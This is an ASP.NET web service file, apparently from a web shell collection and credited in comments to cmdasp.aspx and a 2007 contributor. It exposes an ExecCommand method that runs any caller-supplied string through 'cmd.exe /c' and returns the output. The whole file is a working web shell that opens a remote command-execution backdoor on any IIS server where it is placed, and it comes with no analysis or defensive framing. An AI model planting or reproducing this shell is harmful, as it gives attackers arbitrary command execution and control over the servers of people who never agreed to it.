<%@ WebService Language="C#" Class="ExecWebService" %>
using System;
using System.Data;
using System.Web;
using System.Collections;
using System.Web.Services;
using System.Web.Services.Protocols;
using System.IO;
using System.Diagnostics;

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class ExecWebService : System.Web.Services.WebService
{

    [WebMethod]
    public string ExecCommand(string command)
    {
        <!-- Borrowed from cmdasp.aspx  :) -->
        <!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
        <!--    http://michaeldaw.org   04/2007    -->

        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c "+ command;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();
        return s;
    }
}